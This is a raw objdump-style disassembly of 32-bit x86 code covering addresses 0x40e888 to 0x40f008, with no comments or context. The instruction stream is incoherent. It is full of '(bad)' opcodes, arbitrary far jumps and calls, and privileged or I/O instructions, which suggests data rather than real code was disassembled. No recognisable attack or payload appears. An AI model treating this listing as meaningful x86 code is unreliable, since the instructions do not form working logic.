  40e888:	mov    ecx,0xd5c15258
  40e88d:	jae    0x40e811
  40e88f:	sub    eax,0xee088cc2
  40e894:	pop    esi
  40e895:	push   0x76
  40e897:	push   eax
  40e898:	sbb    bh,BYTE PTR [ebx-0x2ab2cd35]
  40e89e:	mov    ds:0xbdaf9ce0,eax
  40e8a3:	rcl    DWORD PTR [esi+0x68],1
  40e8a6:	imul   esi,DWORD PTR [esi],0x21
  40e8a9:	jb     0x40e855
  40e8ab:	fwait
  40e8ac:	pop    edi
  40e8ad:	push   es
  40e8ae:	jg     0x40e8f2
  40e8b0:	mov    eax,es
  40e8b2:	jae    0x40e83d
  40e8b4:	fadd   st,st(5)
  40e8b6:	gs or  al,0x14
  40e8b9:	mov    WORD PTR [eax-0x72c43e59],?
  40e8bf:	(bad)  
  40e8c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8c1:	retf   0x64c2
  40e8c4:	retf   
  40e8c5:	mov    bh,0x52
  40e8c7:	or     ah,BYTE PTR [eax-0x1e497b4]
  40e8cd:	add    al,0x9e
  40e8cf:	mov    dh,0x16
  40e8d1:	int3   
  40e8d2:	loopne 0x40e94d
  40e8d4:	sub    al,0x4a
  40e8d6:	bound  ecx,QWORD PTR [ecx-0x69]
  40e8d9:	push   eax
  40e8da:	jmp    0x40ede5
  40e8df:	ds (bad) 
  40e8e1:	sar    BYTE PTR [edi],cl
  40e8e3:	(bad)  
  40e8e5:	rol    ebp,1
  40e8e7:	imul   edi,DWORD PTR [ebp+0x1914749e],0x490417d9
  40e8f1:	js     0x40e96b
  40e8f3:	push   0x7c
  40e8f5:	js     0x40e96f
  40e8f7:	das    
  40e8f8:	cmc    
  40e8f9:	jo     0x40e8a2
  40e8fb:	fst    DWORD PTR [edx+0x56]
  40e8fe:	inc    esp
  40e8ff:	int    0x33
  40e901:	mov    ds:0x64fca2ff,eax
  40e906:	sbb    eax,esi
  40e908:	dec    ebx
  40e909:	loop   0x40e937
  40e90b:	call   0x152d6cb2
  40e910:	data16 aam 0xe
  40e913:	adc    al,0x7a
  40e915:	adc    DWORD PTR [esi+0x60],ebp
  40e918:	scas   al,BYTE PTR es:[edi]
  40e919:	out    dx,eax
  40e91a:	mov    esp,0x1707f2c5
  40e91f:	rcl    DWORD PTR [esi+0x3d],cl
  40e922:	das    
  40e923:	inc    ebp
  40e924:	add    DWORD PTR [ebp+0x7a],ebx
  40e927:	fdivr  st,st(6)
  40e929:	adc    ebx,DWORD PTR [esi]
  40e92b:	push   eax
  40e92c:	shl    BYTE PTR [ecx],0x21
  40e92f:	jmp    0x91368dd1
  40e934:	fnstenv [edx-0x778c083f]
  40e93a:	and    edx,0x46d322e1
  40e940:	mov    dl,BYTE PTR [ebx]
  40e942:	lock jmp 0x40e8e7
  40e945:	shr    al,cl
  40e947:	pop    ebp
  40e948:	mov    BYTE PTR [edi+0x6dbc198f],0x27
  40e94f:	hlt    
  40e950:	xor    al,0xb2
  40e952:	pop    ebx
  40e953:	sbb    eax,0x4a29ddac
  40e958:	test   al,0x79
  40e95a:	add    eax,0x31a5a20c
  40e95f:	loop   0x40e958
  40e961:	ins    DWORD PTR es:[edi],dx
  40e962:	aam    0xf
  40e964:	pop    esi
  40e965:	push   ss
  40e966:	lods   al,BYTE PTR ds:[esi]
  40e967:	aaa    
  40e968:	stos   DWORD PTR es:[edi],eax
  40e969:	mov    eax,ds:0x55d1b107
  40e96e:	xchg   edx,eax
  40e96f:	(bad)  
  40e970:	int    0x20
  40e972:	shl    DWORD PTR [esi+0x30],1
  40e975:	add    DWORD PTR [eax-0x4f201287],0xca9b5506
  40e97f:	push   ebx
  40e980:	lahf   
  40e981:	aam    0xa4
  40e983:	and    BYTE PTR [esi+eax*4-0x3b3853b3],cl
  40e98a:	scas   al,BYTE PTR es:[edi]
  40e98b:	les    eax,FWORD PTR [eax+0x607c3db8]
  40e991:	ds adc cl,bl
  40e994:	cmp    esi,DWORD PTR es:[ebx+0x47dc791f]
  40e99b:	xchg   esi,eax
  40e99c:	sub    esi,esi
  40e99e:	xchg   esi,eax
  40e99f:	in     eax,dx
  40e9a0:	ret    0x81ac
  40e9a3:	lods   al,BYTE PTR ds:[esi]
  40e9a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9a5:	pop    ss
  40e9a6:	jg     0x40e9c4
  40e9a8:	int3   
  40e9a9:	xchg   ebx,eax
  40e9aa:	(bad)  
  40e9ab:	sti    
  40e9ac:	push   es
  40e9ad:	add    eax,0xd1b67e05
  40e9b2:	sar    bl,1
  40e9b4:	mov    eax,ds:0xbfe701d9
  40e9b9:	inc    esp
  40e9ba:	ja     0x40e993
  40e9bc:	pop    esi
  40e9bd:	inc    ebx
  40e9be:	pop    eax
  40e9bf:	and    eax,0x6f3d50ea
  40e9c4:	jp     0x40e9dd
  40e9c6:	cld    
  40e9c7:	jo     0x40e96e
  40e9c9:	sub    BYTE PTR [edx-0x4f],dh
  40e9cc:	xchg   ebx,eax
  40e9cd:	push   es
  40e9ce:	push   ebp
  40e9cf:	mov    edi,0x784a8565
  40e9d4:	jmp    0xffa4e985
  40e9d9:	repnz (bad) 
  40e9db:	xlat   BYTE PTR ds:[ebx]
  40e9dc:	es push ebp
  40e9de:	or     al,0x6b
  40e9e0:	loopne 0x40ea15
  40e9e2:	icebp  
  40e9e3:	sub    ch,dh
  40e9e5:	inc    esi
  40e9e6:	sub    BYTE PTR [edx+ebx*4],dl
  40e9e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9ea:	stos   BYTE PTR es:[edi],al
  40e9eb:	lds    edx,FWORD PTR [edi+0x1ac11c3c]
  40e9f1:	fldenv [edx-0x6e6a8c85]
  40e9f7:	sub    bl,0xd5
  40e9fa:	xchg   esi,eax
  40e9fb:	call   FWORD PTR [ecx-0x58]
  40e9fe:	or     eax,0xcf7e69f8
  40ea03:	(bad)  
  40ea04:	pop    ebx
  40ea05:	sbb    ah,bh
  40ea07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea08:	aaa    
  40ea09:	pop    ebx
  40ea0a:	outs   dx,BYTE PTR ds:[esi]
  40ea0b:	pop    ss
  40ea0c:	call   0xf4ee:0x4c915196
  40ea13:	cmp    ebx,eax
  40ea15:	enter  0x7dfb,0x85
  40ea19:	and    DWORD PTR [esp],ebx
  40ea1c:	fistp  QWORD PTR [ebp+edx*2+0x2b83105a]
  40ea23:	add    DWORD PTR [ecx-0x53dd58f8],eax
  40ea29:	pop    ebp
  40ea2a:	jg     0x40ea73
  40ea2c:	mov    ds:0xc47af882,eax
  40ea31:	push   es
  40ea32:	adc    edi,eax
  40ea34:	in     al,dx
  40ea35:	lds    edx,FWORD PTR [edi-0x40]
  40ea38:	out    dx,al
  40ea39:	inc    esp
  40ea3a:	stos   DWORD PTR es:[edi],eax
  40ea3b:	les    esi,FWORD PTR [edi+0x54c82f79]
  40ea41:	stc    
  40ea42:	scas   al,BYTE PTR es:[edi]
  40ea43:	mov    al,0x2
  40ea45:	pop    ebx
  40ea46:	pop    ebp
  40ea47:	mov    dh,0x94
  40ea49:	outs   dx,DWORD PTR ds:[esi]
  40ea4a:	fdiv   st,st(0)
  40ea4c:	(bad)  
  40ea4d:	es sub eax,0x71459982
  40ea53:	nop
  40ea54:	into   
  40ea55:	jle    0x40ea9e
  40ea57:	mov    BYTE PTR [edx],al
  40ea59:	mov    bh,0x7f
  40ea5b:	mov    al,ds:0xa9e88624
  40ea60:	mov    ds:0xfd18e2c6,eax
  40ea66:	pop    ebx
  40ea67:	lahf   
  40ea68:	dec    esi
  40ea69:	push   edx
  40ea6a:	ret    0x6fdd
  40ea6d:	inc    eax
  40ea6e:	mov    dh,0xb2
  40ea70:	add    BYTE PTR [edi-0x70],0xb2
  40ea74:	mov    ah,0xfe
  40ea76:	jmp    0x75db:0xd7f8081
  40ea7d:	pop    edx
  40ea7e:	sbb    BYTE PTR [edx],al
  40ea80:	rcl    DWORD PTR [esi+0x4596cc06],0xe1
  40ea87:	add    DWORD PTR [eax+0x135caf70],esi
  40ea8d:	cmp    DWORD PTR [ebx-0x542d468],0x6d585aa3
  40ea97:	ss pop esi
  40ea99:	push   ebx
  40ea9a:	mov    edi,0x60511bac
  40ea9f:	mov    edx,0xca29ab2e
  40eaa4:	mov    ecx,0x295cade6
  40eaa9:	sar    BYTE PTR [edi-0x3d],cl
  40eaac:	repz push esi
  40eaae:	or     ebp,DWORD PTR [ebx-0x1a182dc9]
  40eab4:	(bad)  gs:[ecx]
  40eab7:	xor    DWORD PTR [edi],edx
  40eab9:	int    0xb4
  40eabb:	aad    0x1a
  40eabd:	into   
  40eabe:	push   ds
  40eabf:	arpl   WORD PTR [eax+edi*1-0x7b],sp
  40eac3:	sbb    eax,0x4d3059cc
  40eac8:	(bad)  
  40eac9:	adc    eax,edx
  40eacb:	in     al,dx
  40eacc:	sbb    al,0x82
  40eace:	test   eax,0x3df6748a
  40ead3:	sbb    esp,edx
  40ead5:	loop   0x40eaea
  40ead7:	and    esp,DWORD PTR [ebx-0x48606f5d]
  40eadd:	mov    al,ds:0x2337333a
  40eae2:	mov    al,0xb7
  40eae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eae5:	mov    al,ds:0x8efb7a20
  40eaea:	shl    BYTE PTR [ecx+0x46f634f7],0xc8
  40eaf1:	cli    
  40eaf2:	adc    al,0x33
  40eaf4:	lahf   
  40eaf5:	xchg   ebx,eax
  40eaf6:	jne    0x40eb16
  40eaf8:	nop
  40eaf9:	adc    al,0x3b
  40eafb:	dec    esi
  40eafc:	clc    
  40eafd:	test   BYTE PTR [edx],bl
  40eaff:	dec    bx
  40eb01:	lods   al,BYTE PTR ds:[esi]
  40eb02:	xor    DWORD PTR [edi],0xffffff9f
  40eb05:	mov    bh,0x4b
  40eb07:	jo     0x40eb5e
  40eb09:	xchg   ecx,eax
  40eb0a:	ficomp DWORD PTR [eax-0x19f60d8d]
  40eb10:	sub    al,0xa2
  40eb12:	jb     0x40ead6
  40eb14:	es jmp 0x40eaa2
  40eb17:	icebp  
  40eb18:	cvtps2pd xmm4,QWORD PTR [esi]
  40eb1b:	(bad)  
  40eb1e:	ret    
  40eb1f:	into   
  40eb20:	pushf  
  40eb21:	outs   dx,BYTE PTR ds:[esi]
  40eb22:	imul   esp,DWORD PTR [ebx],0x2690dccc
  40eb28:	cmc    
  40eb29:	jmp    0xb1ba:0x314336df
  40eb30:	enter  0x1922,0x71
  40eb34:	or     ax,sp
  40eb37:	xchg   esi,eax
  40eb38:	mov    ah,0x63
  40eb3a:	mov    dl,0xfb
  40eb3c:	int3   
  40eb3d:	scas   al,BYTE PTR es:[edi]
  40eb3e:	(bad)  [ebx+0x53347384]
  40eb44:	test   DWORD PTR [edx],ecx
  40eb46:	leave  
  40eb47:	(bad)  [eax]
  40eb49:	in     al,0x35
  40eb4b:	jg     0x40ebc4
  40eb4d:	inc    ebp
  40eb4e:	fimul  WORD PTR [eax+ecx*2-0x13e76078]
  40eb55:	mov    al,0x22
  40eb57:	add    eax,0xc3347a60
  40eb5c:	int    0x7
  40eb5e:	push   ebp
  40eb5f:	cmp    al,0x79
  40eb61:	into   
  40eb62:	push   es
  40eb63:	mov    ebp,0xb9b6572d
  40eb68:	pop    edx
  40eb69:	inc    eax
  40eb6a:	pop    ds
  40eb6b:	neg    esi
  40eb6d:	xor    bh,BYTE PTR [edi]
  40eb6f:	(bad)  
  40eb70:	pop    ss
  40eb71:	and    DWORD PTR [edi-0x22d75485],esi
  40eb77:	cmp    BYTE PTR [ebx+0x50],dl
  40eb7a:	loope  0x40eba4
  40eb7c:	mov    ds:0x3f97907,eax
  40eb81:	stos   DWORD PTR es:[edi],eax
  40eb82:	icebp  
  40eb83:	xor    DWORD PTR [edi-0x14],ebp
  40eb86:	mov    ?,ebp
  40eb88:	mov    edi,0x5658210a
  40eb8d:	or     eax,0x3b4c652b
  40eb92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb93:	add    al,0x7
  40eb95:	sti    
  40eb96:	test   al,0xd9
  40eb98:	mov    esp,DWORD PTR [edi+0x73]
  40eb9b:	inc    ecx
  40eb9c:	dec    esp
  40eb9d:	mov    dl,0xa7
  40eb9f:	out    dx,eax
  40eba0:	mov    cl,0xe1
  40eba2:	leave  
  40eba3:	cmp    eax,0x1b8ba633
  40eba8:	in     al,0x49
  40ebaa:	jl     0x40ec11
  40ebac:	mov    ecx,0x8c47119f
  40ebb1:	cdq    
  40ebb2:	inc    edx
  40ebb3:	mov    cl,0xce
  40ebb5:	addr16 cmp ebx,edx
  40ebb8:	stos   DWORD PTR es:[edi],eax
  40ebb9:	cld    
  40ebba:	add    DWORD PTR ds:0x94393050,edx
  40ebc0:	or     ah,dh
  40ebc2:	adc    bh,al
  40ebc4:	dec    ebx
  40ebc5:	mov    eax,0x7aa4bfc1
  40ebca:	or     esp,DWORD PTR [eax+0x7fcf23a7]
  40ebd0:	xor    eax,DWORD PTR [esp+edx*1+0x40]
  40ebd4:	out    dx,al
  40ebd5:	jmp    0x36e7:0xfd6e3a0a
  40ebdc:	cmp    DWORD PTR [ecx-0x4e],esp
  40ebdf:	add    DWORD PTR [edx],eax
  40ebe1:	in     al,dx
  40ebe2:	data16 aam 0x1
  40ebe5:	xor    dh,BYTE PTR [ebx+ebp*4-0x7a]
  40ebe9:	inc    esp
  40ebea:	aad    0x42
  40ebec:	mov    eax,0x48f2102b
  40ebf1:	lods   eax,DWORD PTR ds:[esi]
  40ebf2:	repnz retf 
  40ebf4:	aad    0xbc
  40ebf6:	adc    al,0x22
  40ebf8:	lods   eax,DWORD PTR ds:[esi]
  40ebf9:	mul    ch
  40ebfb:	push   0xc99429d9
  40ec00:	not    BYTE PTR [eax+0x5fdc28a0]
  40ec06:	aas    
  40ec07:	push   esp
  40ec08:	pop    es
  40ec09:	mov    eax,ds:0xb5329272
  40ec0e:	add    ecx,DWORD PTR [eax+0x49f50f5a]
  40ec14:	lahf   
  40ec15:	ror    dh,1
  40ec17:	or     DWORD PTR [esi-0x6a],ecx
  40ec1a:	add    eax,0x66f2fdc6
  40ec1f:	and    bh,0xf1
  40ec22:	cmp    eax,DWORD PTR [esp+esi*1+0x4c]
  40ec26:	cmp    ch,BYTE PTR [edi+0x5fb7539f]
  40ec2c:	sbb    BYTE PTR ss:[eax],al
  40ec2f:	nop
  40ec30:	adc    BYTE PTR [esi-0x7e4e5823],0xf8
  40ec37:	jnp    0x40ecaa
  40ec39:	sub    eax,0x5ae44ffb
  40ec3e:	cmc    
  40ec3f:	stc    
  40ec40:	in     al,dx
  40ec41:	sub    al,0x98
  40ec43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec44:	and    al,0xc
  40ec46:	mov    ds,esi
  40ec48:	rol    BYTE PTR [ebp+0x57],cl
  40ec4b:	pop    ebp
  40ec4c:	push   esp
  40ec4d:	mov    ah,BYTE PTR [ebp+0x58ed2592]
  40ec53:	sub    al,0x6
  40ec55:	mov    esp,0xbf6c0fe7
  40ec5a:	(bad)  
  40ec5b:	(bad)  
  40ec5c:	pop    edx
  40ec5d:	das    
  40ec5e:	mov    ecx,ds
  40ec60:	xor    al,0xf
  40ec62:	frstor [edi-0x7a13ba50]
  40ec68:	repz sbb BYTE PTR [ebx],ch
  40ec6b:	dec    edi
  40ec6c:	pop    eax
  40ec6d:	repz sbb eax,0x26fa9e47
  40ec73:	(bad)
  40ec76:	outs   dx,BYTE PTR ds:[esi]
  40ec77:	inc    eax
  40ec78:	adc    esp,ebx
  40ec7a:	jle    0x40ec26
  40ec7c:	aaa    
  40ec7d:	adc    edi,DWORD PTR gs:[esi-0x720469ee]
  40ec84:	repnz pop esp
  40ec86:	icebp  
  40ec87:	adc    eax,0x670061ab
  40ec8c:	fist   DWORD PTR [edi+edi*1+0x54]
  40ec90:	jecxz  0x40ec4c
  40ec92:	int3   
  40ec93:	ficomp DWORD PTR [edi-0x19]
  40ec96:	xchg   ebx,eax
  40ec97:	xchg   ebp,eax
  40ec98:	cmc    
  40ec99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec9a:	sub    ebp,DWORD PTR [ebx+0x76a49f8e]
  40eca0:	(bad)  
  40eca1:	sar    BYTE PTR [eax],cl
  40eca3:	mov    ebp,0xb2751a65
  40eca8:	or     al,ch
  40ecaa:	cdq    
  40ecab:	(bad)  
  40ecac:	leave  
  40ecad:	mov    WORD PTR [ebx-0x18f50e29],?
  40ecb3:	sub    al,0x15
  40ecb5:	pop    es
  40ecb6:	(bad)  
  40ecb7:	push   eax
  40ecb8:	ret    
  40ecb9:	add    al,0xff
  40ecbb:	or     DWORD PTR [edx-0x4d],eax
  40ecbe:	mov    ds:0xac052c8d,al
  40ecc3:	jb     0x40ecb3
  40ecc5:	(bad)  
  40ecc6:	ds aas 
  40ecc8:	outs   dx,BYTE PTR ds:[esi]
  40ecc9:	add    BYTE PTR [ebp-0x2ff4ad38],bl
  40eccf:	inc    esp
  40ecd0:	mov    ecx,0x557a229b
  40ecd5:	cdq    
  40ecd6:	mov    edx,0xfb82df74
  40ecdb:	int    0xc3
  40ecdd:	loopne 0x40ed5e
  40ecdf:	dec    ebx
  40ece0:	out    0xef,al
  40ece2:	pop    ss
  40ece3:	retf   
  40ece4:	call   0xc1bb:0x5d9948a5
  40eceb:	mov    bh,0x7a
  40eced:	sub    dl,cl
  40ecef:	mov    ds:0x6bca496c,eax
  40ecf4:	arpl   WORD PTR [edi+0x715a2320],ax
  40ecfa:	xchg   edx,eax
  40ecfb:	jp     0x40ecff
  40ecfd:	mov    ds:0x2a91fbd9,eax
  40ed02:	test   al,bh
  40ed04:	outs   dx,BYTE PTR ds:[esi]
  40ed05:	test   eax,0x9e14cbd9
  40ed0a:	push   0xbdb31915
  40ed0f:	jnp    0x40ed53
  40ed11:	into   
  40ed12:	stos   BYTE PTR es:[edi],al
  40ed13:	pushf  
  40ed14:	sbb    DWORD PTR [edx+0x6b],esi
  40ed17:	xchg   edx,eax
  40ed18:	test   BYTE PTR [eax+0x56],0xd9
  40ed1c:	retf   0x973e
  40ed1f:	ins    BYTE PTR es:[edi],dx
  40ed20:	dec    eax
  40ed21:	jmp    0x6bdc:0x3768b40d
  40ed28:	imul   ebx,DWORD PTR [esi+0x2725c88e],0xffffffe1
  40ed2f:	call   0x797b:0x42130a28
  40ed36:	rcr    DWORD PTR [ebx+0x3d],1
  40ed39:	jb     0x40ed11
  40ed3b:	mov    edi,0x4a6127e
  40ed40:	add    DWORD PTR [ebx+0x5ee40195],edi
  40ed46:	mov    ds:0x3f8cf2dc,al
  40ed4b:	mov    bh,0x19
  40ed4d:	dec    ebp
  40ed4e:	xchg   esp,eax
  40ed4f:	cmp    esi,esi
  40ed51:	out    dx,al
  40ed52:	xchg   ebx,eax
  40ed53:	xor    eax,0x7a04b3ea
  40ed58:	pop    ebx
  40ed59:	sub    ecx,DWORD PTR [esi+0x7f]
  40ed5c:	lods   eax,DWORD PTR ds:[esi]
  40ed5d:	fisttp DWORD PTR ds:0xe7dfc254
  40ed63:	mov    ecx,0xba1006e6
  40ed68:	push   ecx
  40ed69:	mov    esi,0xd22a9d50
  40ed6e:	mov    bh,BYTE PTR [ebp+0x681decf7]
  40ed74:	xor    BYTE PTR [ebx-0x33536e8a],bl
  40ed7a:	js     0x40ed42
  40ed7c:	cmp    eax,DWORD PTR [ebp+ebx*2-0x2a]
  40ed80:	lea    esp,[edi-0x67221647]
  40ed86:	retf   
  40ed87:	cwde   
  40ed88:	(bad)  
  40ed89:	loop   0x40edef
  40ed8b:	aaa    
  40ed8c:	imul   eax,edi,0xffffffba
  40ed8f:	pop    esi
  40ed90:	push   es
  40ed91:	pop    eax
  40ed92:	adc    eax,0xd366be94
  40ed97:	inc    edi
  40ed98:	das    
  40ed99:	mov    WORD PTR [edi],ds
  40ed9b:	outs   dx,BYTE PTR ds:[esi]
  40ed9c:	ds dec eax
  40ed9e:	adc    eax,0xe5977083
  40eda3:	cld    
  40eda4:	pop    edx
  40eda5:	push   ss
  40eda6:	push   esi
  40eda7:	je     0x40ed41
  40eda9:	stc    
  40edaa:	das    
  40edab:	cmp    eax,0x9bacc8bb
  40edb0:	and    BYTE PTR [edi-0x6c],bh
  40edb3:	or     eax,0xe6c8ede2
  40edb8:	fidivr WORD PTR [ecx-0x68]
  40edbb:	leave  
  40edbc:	mov    esi,0x305f9ccf
  40edc1:	jmp    0x3c762d6c
  40edc6:	les    edi,FWORD PTR [eax]
  40edc8:	test   al,0x61
  40edca:	sub    eax,0x62fd46c5
  40edcf:	mov    bl,0x9b
  40edd1:	jno    0x40ee2b
  40edd3:	aam    0x36
  40edd5:	add    al,0x35
  40edd7:	and    BYTE PTR [edx-0x56379369],0xbe
  40edde:	dec    ecx
  40eddf:	test   BYTE PTR [esi-0x17c4f1d0],bh
  40ede5:	mov    eax,DWORD PTR [ebp-0x1c]
  40ede8:	jmp    0x40f2f3
  40eded:	iret   
  40edee:	iret   
  40edef:	rol    bl,cl
  40edf1:	rol    cl,cl
  40edf3:	int    0xd3
  40edf5:	fldenv [ebp+0x5fa2096d]
  40edfb:	cld    
  40edfc:	sbb    BYTE PTR [esi+0x4d],dh
  40edff:	js     0x40ee79
  40ee01:	push   0x7c
  40ee03:	js     0x40ee7d
  40ee05:	add    eax,0x26decbfd
  40ee0a:	addr16 pushf 
  40ee0c:	les    esp,FWORD PTR [esi-0x610e3ffe]
  40ee12:	shl    eax,0x80
  40ee15:	outs   dx,BYTE PTR ds:[esi]
  40ee16:	lahf   
  40ee17:	nop
  40ee18:	enter  0x78e8,0xf0
  40ee1c:	or     bl,BYTE PTR [eax+0x5d7bf73e]
  40ee22:	frstor [esi+0x44d47b6c]
  40ee28:	pushf  
  40ee29:	fwait
  40ee2a:	xor    al,0x54
  40ee2c:	int    0xae
  40ee2e:	outs   dx,BYTE PTR ds:[esi]
  40ee2f:	ftst   
  40ee31:	fiadd  WORD PTR [edx-0x20aec5f1]
  40ee37:	jl     0x40eead
  40ee39:	pop    edx
  40ee3a:	inc    ecx
  40ee3b:	ss popa 
  40ee3d:	inc    ebp
  40ee3e:	rcl    BYTE PTR [ecx],0x5d
  40ee41:	add    DWORD PTR [ecx],esp
  40ee43:	std    
  40ee44:	pop    ecx
  40ee45:	fwait
  40ee46:	mov    al,ds:0x5120ad2c
  40ee4b:	pop    ss
  40ee4c:	xor    ah,BYTE PTR [ebx]
  40ee4e:	fadd   QWORD PTR [edx+0x79]
  40ee51:	pop    ss
  40ee52:	int    0xe1
  40ee54:	fild   DWORD PTR [ebx-0x28]
  40ee57:	std    
  40ee58:	popa   
  40ee59:	xchg   esi,eax
  40ee5a:	sub    edi,esi
  40ee5c:	rcr    esp,cl
  40ee5e:	imul   edi,DWORD PTR [ebx],0x59
  40ee61:	ja     0x40ee08
  40ee63:	jle    0x40ee5b
  40ee65:	fld    DWORD PTR [esi-0x33]
  40ee68:	adc    eax,0x4adf48d5
  40ee6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee6e:	mov    bl,0xae
  40ee70:	ins    DWORD PTR es:[edi],dx
  40ee71:	fdivr  QWORD PTR [edx]
  40ee73:	popf   
  40ee74:	std    
  40ee75:	dec    esp
  40ee76:	lock push es
  40ee78:	mov    ebp,0xcf288c1e
  40ee7d:	pop    ebx
  40ee7e:	stc    
  40ee7f:	loope  0x40ee15
  40ee81:	leave  
  40ee82:	xor    DWORD PTR [edx-0x18f69b7b],ebp
  40ee88:	add    al,0x3f
  40ee8a:	pop    ecx
  40ee8b:	lock sbb ecx,ebp
  40ee8e:	je     0x40eef1
  40ee90:	in     eax,dx
  40ee91:	sub    ecx,DWORD PTR [ecx-0x2c92eb22]
  40ee97:	xchg   esi,eax
  40ee98:	mov    ebp,ebx
  40ee9a:	popf   
  40ee9b:	sbb    eax,0xca74328c
  40eea0:	and    ch,BYTE PTR [ebp+0x64]
  40eea3:	mov    dh,0xd7
  40eea5:	shl    ebp,cl
  40eea7:	adc    BYTE PTR [ebx],al
  40eea9:	pop    ds
  40eeaa:	inc    ecx
  40eeab:	bound  edx,QWORD PTR [ebp-0x73]
  40eeae:	test   al,0x0
  40eeb0:	mov    ecx,0xa2102d50
  40eeb5:	fidivr DWORD PTR [edi+eax*4+0x51]
  40eeb9:	sub    esp,DWORD PTR [ecx]
  40eebb:	sbb    ebx,eax
  40eebd:	aas    
  40eebe:	inc    ebx
  40eebf:	mul    DWORD PTR [esi+edx*2+0x133c54e4]
  40eec6:	cmp    BYTE PTR [edx+0x12d3042f],ah
  40eecc:	sbb    DWORD PTR [ebx],esp
  40eece:	mov    esp,0xe6007af0
  40eed3:	mov    bh,0x5c
  40eed5:	xor    BYTE PTR [esi+0x6e],dh
  40eed8:	mov    bl,BYTE PTR [eax]
  40eeda:	dec    ebx
  40eedb:	and    ecx,edx
  40eedd:	mov    eax,ds:0x7f0a1765
  40eee2:	xchg   edx,eax
  40eee3:	pop    eax
  40eee4:	sbb    eax,ebp
  40eee6:	sbb    eax,ebp
  40eee8:	jo     0x40eea1
  40eeea:	cmp    eax,0xfa67f8d6
  40eeef:	cli    
  40eef0:	xor    DWORD PTR [edx-0xe],esi
  40eef3:	mov    eax,ds:0xf4852964
  40eef8:	push   ebp
  40eef9:	imul   edi,DWORD PTR ss:0x803fb2fd,0x8b54476
  40ef04:	sbb    al,0xfc
  40ef06:	test   ah,cl
  40ef08:	add    al,0x55
  40ef0a:	pop    edx
  40ef0b:	call   0x50c8:0x9b2076a9
  40ef12:	mov    ch,0x8d
  40ef14:	sub    eax,0x9cb0116a
  40ef19:	push   ebx
  40ef1a:	mov    ch,0xfa
  40ef1c:	inc    edx
  40ef1d:	out    0x69,al
  40ef1f:	dec    ebp
  40ef20:	xchg   edx,eax
  40ef21:	cmp    DWORD PTR [esi],esp
  40ef23:	sub    al,0x4d
  40ef25:	rol    DWORD PTR [esi-0x3c],0x39
  40ef29:	sbb    eax,0x7f323b3
  40ef2e:	push   ds
  40ef2f:	inc    esp
  40ef30:	push   esi
  40ef31:	pop    ss
  40ef32:	out    dx,al
  40ef33:	jl     0x40eebc
  40ef35:	push   esp
  40ef36:	jbe    0x40ef2a
  40ef38:	or     BYTE PTR [eax+0x6519dadd],ah
  40ef3e:	(bad)  
  40ef3f:	dec    edi
  40ef40:	add    BYTE PTR [ebp+0x1580dc2],ch
  40ef46:	dec    eax
  40ef47:	adc    al,0x7c
  40ef49:	stos   DWORD PTR es:[edi],eax
  40ef4a:	ror    DWORD PTR [ebp+ebp*8+0x50],1
  40ef4e:	jecxz  0x40eedd
  40ef50:	cmp    ebx,DWORD PTR [edi+0x1b4131a7]
  40ef56:	sbb    BYTE PTR [edi-0x31],cl
  40ef59:	jl     0x40efb4
  40ef5b:	pop    esi
  40ef5c:	fs scas al,BYTE PTR es:[edi]
  40ef5e:	adc    DWORD PTR [esi+0x7b],ebx
  40ef61:	cmp    al,0x34
  40ef63:	pop    esi
  40ef64:	addr16 sbb eax,0xdea5ebc5
  40ef6a:	jmp    0x5a7a4364
  40ef6f:	sbb    dl,BYTE PTR ds:0xf797aac4
  40ef75:	pop    esi
  40ef76:	xchg   edi,eax
  40ef77:	push   ds
  40ef78:	rol    edx,0xdc
  40ef7b:	cmp    al,0xc5
  40ef7d:	icebp  
  40ef7e:	mov    ch,0xc8
  40ef80:	inc    esp
  40ef81:	loop   0x40efea
  40ef83:	push   0x5e
  40ef85:	jnp    0x40efaf
  40ef87:	outs   dx,DWORD PTR ds:[esi]
  40ef88:	sub    DWORD PTR [ecx-0x54],0xd920e67d
  40ef8f:	xor    al,0x9a
  40ef91:	lea    ecx,[eax+0x65]
  40ef94:	push   ebp
  40ef95:	ds mov cl,0xcc
  40ef98:	idiv   edi
  40ef9a:	push   0xfffffff9
  40ef9c:	cdq    
  40ef9d:	into   
  40ef9e:	into   
  40ef9f:	or     DWORD PTR [ecx],ebp
  40efa1:	test   DWORD PTR [eax-0x6d331e28],edx
  40efa7:	shl    DWORD PTR [edx-0x5d],0x52
  40efab:	out    dx,eax
  40efac:	rcr    BYTE PTR [eax-0x2c0eda0b],0xe9
  40efb3:	xor    BYTE PTR [ecx-0x766eaaee],bh
  40efb9:	aas    
  40efba:	pop    ss
  40efbb:	push   edi
  40efbc:	aam    0x5c
  40efbe:	cdq    
  40efbf:	lock pop ds
  40efc1:	pop    esi
  40efc2:	pop    ebx
  40efc3:	inc    eax
  40efc4:	call   0xcc9892f5
  40efc9:	sub    cl,BYTE PTR [edx]
  40efcb:	loope  0x40eff4
  40efcd:	in     al,dx
  40efce:	aaa    
  40efcf:	add    al,ah
  40efd1:	mov    cl,0xfe
  40efd3:	sbb    al,cl
  40efd5:	stos   DWORD PTR es:[edi],eax
  40efd6:	into   
  40efd7:	cmp    ebp,ebx
  40efd9:	daa    
  40efda:	pop    eax
  40efdb:	loopne 0x40ef8c
  40efdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efde:	mov    bl,0x9f
  40efe0:	push   ss
  40efe1:	xor    al,0xd9
  40efe3:	xchg   DWORD PTR [edx+0x22],ebp
  40efe6:	mov    cl,0x87
  40efe8:	loop   0x40f035
  40efea:	jns    0x40ef9e
  40efec:	xor    ecx,esi
  40efee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efef:	xor    DWORD PTR [edi-0x7c1826c9],eax
  40eff5:	call   0xf9b7:0x2b76340e
  40effc:	sub    eax,0x62d2575c
  40f001:	and    BYTE PTR [esi-0x66],dh
  40f004:	dec    ebx
  40f005:	les    eax,FWORD PTR [ebx+0x7e]
  40f008:	cmp    DWORD PTR [esi],edi
